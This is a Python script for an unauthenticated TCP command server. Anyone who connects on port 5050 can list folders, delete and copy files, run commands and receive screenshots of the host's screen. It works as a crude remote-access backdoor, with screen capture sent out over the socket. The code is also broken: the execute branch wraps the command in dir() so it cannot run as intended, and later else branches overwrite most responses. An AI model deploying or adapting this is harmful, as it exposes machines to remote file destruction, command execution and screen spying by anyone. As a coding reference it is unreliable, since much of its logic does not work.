import socket 
import threading 
import glob
import os
import shutil
from PIL import ImageGrab
import subprocess
from PIL import Image
import pyautogui


HEADER= 64
PORT = 5050 
SERVER = socket.gethostbyname(socket.gethostname())
print (SERVER)
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "disconnected ! "
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind(ADDR)


def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    while connected:
        msg_length = conn.recv(HEADER).decode(FORMAT)
        if msg_length:
            msg_length = int(msg_length)
            msg = conn.recv(msg_length).decode(FORMAT)

            if msg == DISCONNECT_MESSAGE:
                connected = False
                break

            print(f"[{addr}] {msg}")

            #DIR
            if msg.upper().startswith("DIR"):
                try:
                    _, folder_path = msg.split(" ", 1)
                    folder_path = folder_path.strip()
                    files_list = glob.glob(folder_path + "\\*.*")
                    response = "\n".join(files_list) if files_list else "No files found."
                except Exception as e:
                    response = f"Error: {e}"
            else:
                response = "Msg received"

            #DELETE 
            if msg.upper().startswith("DELETE"):
                try:
                    _, folder_path = msg.split(" ", 1)
                    folder_path = folder_path.strip()
                    if os.path.exists(folder_path):
                        os.remove(folder_path)
                except Exception as e:
                    response = f"Error: {e}"
            else:
                response = "Msg received"
            
            #COPY
            if msg.upper().startswith("COPY"):
                try:
                    _, src, dst = msg.split(" ", 2)
                    src = src.strip()
                    dst = dst.strip()

                    shutil.copy(src, dst)
                    response = f"File copied from {src} to {dst} successfully."
                except Exception as e:
                    response = f"Error: {e}"

            else:
                response = "Msg received"

            #EXECUTE
            if msg.upper().startswith("EXE"):
                try: 
                    if(subprocess.call(dir(msg.split(" ", 1)))):
                       response = "Command executed."
                except Exception as e:
                    response = f"Error: {e}"
            else:
                response = "Msg received"    

            #SCREENSHOT
            if msg.upper().startswith("SS"):
                try:
                    screenshot = ImageGrab.grab()
                    screenshot.save("screenshot.png")
                    screenshot.close()
                except Exception as e:
                    response = f"Error: {e}"
            else:
                response = "Msg received"
            
            #send photo
            if msg.upper().startswith("SSS"):
                try:
                    screenshot = pyautogui.screenshot()
                    screenshot.save("screenshot.png")
                    
                    with open("screenshot.png", "rb") as f:
                        photo_to_send = f.read()

                    size = len(photo_to_send)
                    size_str = f"{size:07}"
                    conn.send(size_str.encode(FORMAT))

                    for i in range(0, size, 4096):
                        chunk = photo_to_send[i:i+4096]
                        conn.send(chunk)
                    
                    response = "File sent successfully."
                except Exception as e:
                            response = f"Error: {e}"
                else:
                    response = "Msg received"
            
            conn.send(response.encode(FORMAT))
            
            

    conn.close()

def start():
    server.listen()
    print (f"[LISTINING] Server is listening on {SERVER}")
    while True:
        conn , addr = server.accept()
        thread = threading.Thread(target = handle_client, args = (conn , addr))
        thread.start()
        print (f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

print ("[STARTING]")
start()